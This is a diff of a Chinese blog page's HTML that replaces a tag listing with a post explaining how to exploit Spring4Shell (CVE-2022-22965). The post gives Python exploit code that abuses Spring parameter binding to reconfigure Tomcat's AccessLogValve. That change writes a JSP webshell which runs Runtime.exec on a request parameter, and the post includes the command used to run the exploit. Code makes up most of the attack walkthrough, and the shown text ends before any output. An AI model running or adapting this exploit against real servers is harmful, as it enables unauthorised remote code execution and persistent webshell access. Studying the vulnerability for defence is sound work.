@@ -1,6 +1,6 @@
 <!doctype html>
 
-<html lang="zh-CN">
+<html lang="zh-CN" data-fancybox-enabled="1">
 <head>
   
 
@@ -8,21 +8,26 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="theme-color" content="#f7f3e9">
 
-<title>标签：手机 | ZapcoMan&#39;s world</title>
-<meta name="description" content="标签「手机」收录 1 篇文章，包括破解手机锁屏密码。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="标签：手机 | ZapcoMan&#39;s world">
-<meta property="og:url" content="http://example.com/tags/%E6%89%8B%E6%9C%BA/">
+<title>CVE-2022-22965 Spring4Shell RCE漏洞利用——从原理到EXP实现 | ZapcoMan&#39;s world</title>
+<meta name="description" content="本文仅供合法授权的安全研究与学习使用，请勿用于非法用途。读者应确保行为符合当地法律法规。 前言2022年3月底，Spring框架爆出了震惊整个Java安全圈的CVE-2022-22965漏洞，被业界称为”Spring4Shell”。这个漏洞利用了Spring框架参数绑定机制中的缺陷，通过精心构造的请求参数，攻击者可以操纵Tomcat底层日志配置，最终写入恶意...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2022-22965 Spring4Shell RCE漏洞利用——从原理到EXP实现 | ZapcoMan&#39;s world">
+<meta property="og:url" content="http://example.com/2026/07/06/2026070612/">
 <meta property="og:site_name" content="ZapcoMan&#39;s world">
-<meta property="og:description" content="标签「手机」收录 1 篇文章，包括破解手机锁屏密码。">
+<meta property="og:description" content="本文仅供合法授权的安全研究与学习使用，请勿用于非法用途。读者应确保行为符合当地法律法规。 前言2022年3月底，Spring框架爆出了震惊整个Java安全圈的CVE-2022-22965漏洞，被业界称为”Spring4Shell”。这个漏洞利用了Spring框架参数绑定机制中的缺陷，通过精心构造的请求参数，攻击者可以操纵Tomcat底层日志配置，最终写入恶意...">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-07-06T02:30:25.000Z">
+<meta property="article:modified_time" content="2026-07-06T02:38:41.333Z">
 <meta property="article:author" content="ZapcoMan">
+<meta property="article:tag" content="CVE">
+<meta property="article:tag" content="POC">
+<meta property="article:tag" content="漏洞利用">
 <meta name="twitter:card" content="summary">
-<link rel="canonical" href="http://example.com/tags/%E6%89%8B%E6%9C%BA/">
+<link rel="canonical" href="http://example.com/2026/07/06/2026070612/">
 
 <link rel="icon" href="https://avatars.githubusercontent.com/u/66863012?s=400&amp;u=12653af0def352c0458bfcf15b96cfa21fcaf518&amp;v=4">
 
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"CollectionPage","headline":"标签：手机 | ZapcoMan's world","name":"标签：手机 | ZapcoMan's world","description":"标签「手机」收录 1 篇文章，包括破解手机锁屏密码。","url":"http://example.com/tags/%E6%89%8B%E6%9C%BA/","inLanguage":"zh-CN","isPartOf":{"@type":"WebSite","name":"ZapcoMan's world","url":"http://example.com/"},"about":"标签：手机"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"CVE-2022-22965 Spring4Shell RCE漏洞利用——从原理到EXP实现","name":"CVE-2022-22965 Spring4Shell RCE漏洞利用——从原理到EXP实现 | ZapcoMan's world","description":"本文仅供合法授权的安全研究与学习使用，请勿用于非法用途。读者应确保行为符合当地法律法规。 前言2022年3月底，Spring框架爆出了震惊整个Java安全圈的CVE-2022-22965漏洞，被业界称为”Spring4Shell”。这个漏洞利用了Spring框架参数绑定机制中的缺陷，通过精心构造的请求参数，攻击者可以操纵Tomcat底层日志配置，最终写入恶意...","url":"http://example.com/2026/07/06/2026070612/","inLanguage":"zh-CN","isPartOf":{"@type":"WebSite","name":"ZapcoMan's world","url":"http://example.com/"},"mainEntityOfPage":"http://example.com/2026/07/06/2026070612/","datePublished":"2026-07-06T02:30:25.000Z","dateModified":"2026-07-06T02:38:41.333Z","author":{"@type":"Person","name":"ZapcoMan"},"publisher":{"@type":"Organization","name":"ZapcoMan's world"},"keywords":"CVE, POC, 漏洞利用"}</script>
 
 <script>
   (function () {
@@ -56,13 +61,16 @@
   
 
   
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css">
+<script defer src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js"></script>
+
 
   
 <meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="ZapcoMan's world" type="application/atom+xml">
 </head>
 
 <body
-  class="is-list tag-style-tape bg-style-default"
+  class="is-post tag-style-tape bg-style-default"
   data-default-accent="blue"
   data-code-theme="dark"
   data-note-style="sticky"
@@ -134,7 +142,7 @@
       
     
       
-        <div class="site-nav-item has-children active">
+        <div class="site-nav-item has-children">
           <button class="site-nav-link site-nav-parent" type="button" aria-haspopup="true" aria-expanded="false">
             
 <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-folder"></use></svg>
@@ -150,7 +158,7 @@
                 <span>分类</span>
               </a>
             
-              <a role="menuitem" class="active" href="/tags/">
+              <a role="menuitem" class="" href="/tags/">
                 
 <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tag flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-tag"></use></svg>
 
@@ -219,7 +227,7 @@
 
 
   
-  <main class="paper-shell ">
+  <main class="paper-shell paper-shell--article">
     
 
 <aside id="paper-sidebar-drawer" class="paper-sidebar paper-sidebar--right" aria-label="侧边栏">
@@ -285,8 +293,8 @@
         
       
         
-          <div class="drawer-nav-group is-open active">
-            <button class="drawer-nav-parent" type="button" aria-expanded="true">
+          <div class="drawer-nav-group">
+            <button class="drawer-nav-parent" type="button" aria-expanded="false">
               
 <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-folder"></use></svg>
 
@@ -301,7 +309,7 @@
                   <span>分类</span>
                 </a>
               
-                <a class="active" href="/tags/">
+                <a class="" href="/tags/">
                   
 <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tag flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-tag"></use></svg>
 
@@ -398,90 +406,28 @@
   
 
   
-    <section class="side-card categories-card">
-      <h2>
-<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-folder"></use></svg>
-分类</h2>
-      
-        <a href="/categories/Java/">
-          <span class="dot dot-0"></span>
-          <strong>Java</strong>
-          <em>6</em>
-        </a>
-      
-        <a href="/categories/Java/Springboot/">
-          <span class="dot dot-1"></span>
-          <strong>Springboot</strong>
-          <em>5</em>
-        </a>
-      
-        <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
-          <span class="dot dot-2"></span>
-          <strong>网络安全</strong>
-          <em>21</em>
-        </a>
-      
-        <a href="/categories/python/">
-          <span class="dot dot-3"></span>
-          <strong>python</strong>
-          <em>17</em>
-        </a>
-      
-        <a href="/categories/Java/Springboot/Mybatis/">
-          <span class="dot dot-0"></span>
-          <strong>Mybatis</strong>
-          <em>4</em>
-        </a>
-      
-        <a href="/categories/AI/">
-          <span class="dot dot-1"></span>
-          <strong>AI</strong>
-          <em>2</em>
-        </a>
-      
-    </section>
+    <div class="post-sticky-stack">
+      <section class="side-card toc-card">
+        <header class="toc-card__head">
+          <h2>
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-table-of-contents flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-table-of-contents"></use></svg>
+文章目录</h2>
+          <button type="button" class="toc-toggle-all" data-action="toggle-toc" aria-pressed="false" aria-label="展开全部目录" title="展开全部目录">
+            
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chevron-down flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-chevron-down"></use></svg>
 
-    <section class="side-card tag-card">
-      <header class="tag-card__head">
-        <h2>
-<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-flame flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-flame"></use></svg>
-热门标签</h2>
-        <a class="tag-card__more" href="/tags/">
-          <span>查看全部</span>
+          </button>
+        </header>
+        <div class="toc-content">
           
-<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-right flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-arrow-right"></use></svg>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="toc-text">漏洞背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC-EXP%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF"><span class="toc-text">POC&#x2F;EXP实现思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90"><span class="toc-text">核心代码解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%9E%84%E9%80%A0"><span class="toc-text">请求头构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E6%97%A5%E5%BF%97Pattern%E6%9E%84%E9%80%A0"><span class="toc-text">恶意日志Pattern构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE"><span class="toc-text">日志文件配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-text">利用执行流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0"><span class="toc-text">命令行参数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E4%B8%8E%E5%88%A9%E7%94%A8%E6%95%88%E6%9E%9C"><span class="toc-text">漏洞验证与利用效果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+          
+        </div>
+      </section>
+      
 
-        </a>
-      </header>
-      <div class="tag-cloud">
-        
-        
-          <a class="tag-chip tag-chip-0" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
-        
-          <a class="tag-chip tag-chip-1" href="/tags/python/">python</a>
-        
-          <a class="tag-chip tag-chip-2" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
-        
-          <a class="tag-chip tag-chip-3" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a>
-        
-          <a class="tag-chip tag-chip-4" href="/tags/%E9%9A%8F%E6%89%8B%E8%AE%B0/">随手记</a>
-        
-          <a class="tag-chip tag-chip-5" href="/tags/Java/">Java</a>
-        
-          <a class="tag-chip tag-chip-0" href="/tags/Springboot/">Springboot</a>
-        
-          <a class="tag-chip tag-chip-1" href="/tags/%E7%88%AC%E8%99%AB/">爬虫</a>
-        
-          <a class="tag-chip tag-chip-2" href="/tags/Kali-Linux/">Kali  Linux</a>
-        
-          <a class="tag-chip tag-chip-3" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a>
-        
-          <a class="tag-chip tag-chip-4" href="/tags/CVE/">CVE</a>
-        
-          <a class="tag-chip tag-chip-5" href="/tags/POC/">POC</a>
-        
-      </div>
-    </section>
+
+    </div>
   
 
   
@@ -490,427 +436,280 @@
 
     <section class="paper-main">
       
-<section class="archive-paper">
+
+<div class="article-tape-wrap">
+<span class="tape tape--top-right" aria-hidden="true"></span>
+<article class="article-paper">
   
-    <h1>手机</h1>
-  
-  <div class="archive-list">
+  <header class="article-header">
     
-      <a class="archive-item" href="/2026/06/26/2026062619/">
-        <span>2026-06-26</span>
-        <strong>破解手机锁屏密码</strong>
-        <em></em>
+      <a class="label-pill" href="/categories/python/">
+        
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-folder flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-folder"></use></svg>
+
+        python
       </a>
     
+    <h1>CVE-2022-22965 Spring4Shell RCE漏洞利用——从原理到EXP实现</h1>
+    <div class="meta-line meta-line--article">
+      <span class="meta-date">
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-calendar flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-calendar"></use></svg>
+2026-07-06</span>
+      
+        <span class="meta-tags">
+          
+<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tag flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="#flatpaper-icon-lucide-tag"></use></svg>
+
+          <a class="meta-tag-link" href="/tags/CVE/">#CVE</a><a class="meta-tag-link" href="/tags/POC/">#POC</a><a class="meta-tag-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">#漏洞利用</a>
+        </span>
+      
+    </div>
+  </header>
+
+  
+
+
+  <div class="article-content">
+    <blockquote>
+<p>本文仅供合法授权的安全研究与学习使用，请勿用于非法用途。读者应确保行为符合当地法律法规。</p>
+</blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2022年3月底，Spring框架爆出了震惊整个Java安全圈的CVE-2022-22965漏洞，被业界称为”Spring4Shell”。这个漏洞利用了Spring框架参数绑定机制中的缺陷，通过精心构造的请求参数，攻击者可以操纵Tomcat底层日志配置，最终写入恶意JSP WebShell，实现远程代码执行。</p>
+<p>作为一名安全研究人员，深入理解这个漏洞的利用链路对于防御类似攻击至关重要。本文将基于真实的EXP源码，从漏洞原理到代码实现，进行完整的剖析。</p>
+<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><table>
+<thead>
+<tr>
+<th>属性</th>
+<th>详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CVE编号</td>
+<td>CVE-2022-22965</td>
+</tr>
+<tr>
+<td>漏洞类型</td>
+<td>远程代码执行（RCE）</td>
+</tr>
+<tr>
+<td>CVSS评分</td>
+<td>9.8（Critical）</td>
+</tr>
+<tr>
+<td>影响框架</td>
+<td>Spring Framework 5.3.0-5.3.17, 5.2.0-5.2.19</td>
+</tr>
+<tr>
+<td>漏洞根因</td>
+<td>Spring MVC参数绑定机制允许访问ClassLoader内部属性</td>
+</tr>
+</tbody></table>
+<p>Spring框架的<code>DataBinder</code>机制会自动将HTTP请求参数绑定到Java对象属性上。当参数路径中包含<code>class.module.classLoader</code>时，Spring会递归地通过反射访问对象的ClassLoader属性链，最终触及Tomcat的<code>WebappClassLoader</code>。而Tomcat的ClassLoader内部持有<code>AccessLogValve</code>对象，攻击者可以通过修改日志配置，将日志输出为<code>.jsp</code>文件，并在日志内容中注入JSP代码，从而实现WebShell写入。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
+<li><strong>靶机环境</strong>：Spring Boot 2.5.x + 内嵌Tomcat 9.x，运行在JDK 9+环境中</li>
+<li><strong>攻击环境</strong>：Python 3.x + requests库</li>
+<li><strong>网络要求</strong>：攻击机可访问目标Web服务</li>
+</ul>
+<p>JDK 9+是关键前提，因为JDK 9引入了模块系统（Module），使得<code>class.getModule()</code>方法可用，这是整个利用链的入口点。</p>
+<h2 id="POC-EXP实现思路"><a href="#POC-EXP实现思路" class="headerlink" title="POC&#x2F;EXP实现思路"></a>POC&#x2F;EXP实现思路</h2><p>整个EXP的利用流程分为四个阶段：</p>
+<ol>
+<li><strong>重置日志变量</strong>：清除<code>fileDateFormat</code>字段，允许多次执行漏洞利用</li>
+<li><strong>修改日志配置</strong>：通过POST请求注入恶意参数，设置日志文件的目录、文件名、后缀和内容模板</li>
+<li><strong>触发日志写入</strong>：发送GET请求，Tomcat记录访问日志时将恶意JSP代码写入文件</li>
+<li><strong>清理痕迹</strong>：重置日志pattern字段，防止后续日志继续写入恶意内容</li>
+</ol>
+<p>EXP的核心在于构造参数绑定链：<code>class.module.classLoader.resources.context.parent.pipeline.first</code>，这条链从Spring的参数绑定出发，经由Java模块系统→ClassLoader→Tomcat内部资源→Context→Pipeline→AccessLogValve，最终到达Tomcat的访问日志阀门对象。</p>
+<h2 id="核心代码解析"><a href="#核心代码解析" class="headerlink" title="核心代码解析"></a>核心代码解析</h2><h3 id="请求头构造"><a href="#请求头构造" class="headerlink" title="请求头构造"></a>请求头构造</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义 POST 请求头，指定内容类型为表单数据</span></span><br><span class="line">post_headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 GET 请求头，包含用于绕过检查的特殊前缀和后缀</span></span><br><span class="line">get_headers = &#123;</span><br><span class="line">    <span class="string">&quot;prefix&quot;</span>: <span class="string">&quot;&lt;%&quot;</span>,</span><br><span class="line">    <span class="string">&quot;suffix&quot;</span>: <span class="string">&quot;%&gt;//&quot;</span>,</span><br><span class="line">    <span class="comment"># 该字段设置为 &quot;Runtime&quot; 是为了绕过某些检查机制</span></span><br><span class="line">    <span class="string">&quot;c&quot;</span>: <span class="string">&quot;Runtime&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>GET请求头中的<code>prefix</code>和<code>suffix</code>会被日志pattern中的<code>%{prefix}i</code>引用，最终在生成的JSP文件中拼接为<code>&lt;% ... %&gt;</code>的JSP代码块。<code>c</code>字段设为<code>Runtime</code>，对应payload中的<code>%{c}i</code>，将在JSP中被替换为<code>Runtime</code>字符串，用于调用<code>Runtime.getRuntime().exec()</code>。</p>
+<h3 id="恶意日志Pattern构造"><a href="#恶意日志Pattern构造" class="headerlink" title="恶意日志Pattern构造"></a>恶意日志Pattern构造</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_exploit</span>(<span class="params">url, directory, filename</span>):</span><br><span class="line">    <span class="comment"># 构建日志模式字符串，用于注入恶意代码</span></span><br><span class="line">    log_pattern = <span class="string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20&quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter&quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B&quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>URL解码后，这个pattern实际上是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;prefix&#125;i java.io.InputStream in = %&#123;c&#125;i.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; %&#123;suffix&#125;i</span><br></pre></td></tr></table></figure>
+
+<p>当Tomcat记录访问日志时，<code>%{prefix}i</code>会被替换为请求头中<code>prefix</code>的值<code>&lt;%</code>，<code>%{c}i</code>替换为<code>Runtime</code>，<code>%{suffix}i</code>替换为<code>%&gt;//</code>。最终写入日志文件的内容就是一段完整的JSP代码：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream(); <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>; <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>]; <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b)); &#125; %&gt;<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="日志文件配置"><a href="#日志文件配置" class="headerlink" title="日志文件配置"></a>日志文件配置</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置日志文件的后缀为 .jsp</span></span><br><span class="line">log_file_suffix = <span class="string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&quot;</span></span><br><span class="line"><span class="comment"># 设置日志文件存储的目录</span></span><br><span class="line">log_file_dir = <span class="string">f&quot;class.module.classLoader.resources.context.parent.pipeline.first.directory=<span class="subst">&#123;directory&#125;</span>&quot;</span></span><br><span class="line"><span class="comment"># 设置日志文件的前缀，即生成的文件名</span></span><br><span class="line">log_file_prefix = <span class="string">f&quot;class.module.classLoader.resources.context.parent.pipeline.first.prefix=<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line"><span class="comment"># 清除日志文件日期格式配置</span></span><br><span class="line">log_file_date_format = <span class="string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这四个参数分别控制AccessLogValve的：</p>
+<ul>
+<li><strong>suffix</strong>：日志文件后缀，设为<code>.jsp</code>使其被当作JSP执行</li>
+<li><strong>directory</strong>：日志存储目录，默认指向<code>webapps/ROOT</code></li>
+<li><strong>prefix</strong>：日志文件名前缀，即WebShell的文件名</li>
+<li><strong>fileDateFormat</strong>：日期格式后缀，清空以避免文件名中出现日期</li>
+</ul>
+<h3 id="利用执行流程"><a href="#利用执行流程" class="headerlink" title="利用执行流程"></a>利用执行流程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重置 fileDateFormat，允许多次执行</span></span><br><span class="line">file_date_data = <span class="string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 重置日志变量.&quot;</span>)</span><br><span class="line">ret = requests.post(url, headers=post_headers, data=file_date_data, verify=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 响应代码: %d&quot;</span> % ret.status_code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 Tomcat 日志配置</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 修改日志配置&quot;</span>)</span><br><span class="line">ret = requests.post(url, headers=post_headers, data=exp_data, verify=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 响应代码: %d&quot;</span> % ret.status_code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待配置更改生效</span></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送GET请求触发日志写入WebShell</span></span><br><span class="line">ret = requests.get(url, headers=get_headers, verify=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 响应代码: %d&quot;</span> % ret.status_code)</span><br></pre></td></tr></table></figure>
+
+<p>整个利用流程发送三个HTTP请求：</p>
+<ol>
+<li><strong>POST请求1</strong>：重置<code>fileDateFormat</code>为<code>_</code>，防止Tomcat因文件已存在而拒绝写入</li>
+<li><strong>POST请求2</strong>：一次性提交所有日志配置参数，修改日志文件的路径、名称、后缀和内容</li>
+<li><strong>GET请求</strong>：携带恶意header访问目标，Tomcat将请求记录到日志中，由于日志文件后缀为<code>.jsp</code>且内容包含JSP代码，WebShell即被创建</li>
+</ol>
+<h3 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;SpringBoot CVE-2022-22965 EXP&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;--url&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;目标 URL&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;--file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;要写入的文件名 [不带扩展名]&#x27;</span>, required=<span class="literal">False</span>, default=<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;--dir&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;要写入的目录。建议使用目标应用的 &quot;webapps/[appname]&quot;&#x27;</span>,</span><br><span class="line">                    required=<span class="literal">False</span>, default=<span class="string">&quot;webapps/ROOT&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>EXP支持三个参数：目标URL、WebShell文件名和写入目录。默认情况下，WebShell会被写入<code>webapps/ROOT</code>目录，即Tomcat的根Web应用目录。</p>
+<h2 id="漏洞验证与利用效果"><a href="#漏洞验证与利用效果" class="headerlink" title="漏洞验证与利用效果"></a>漏洞验证与利用效果</h2><p>执行以下命令发起攻击：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py --url http://target:8080 --file shell --<span class="built_in">dir</span> webapps/ROOT</span><br></pre></td></tr></table></figure>
+
+<p>输出结果：</p>
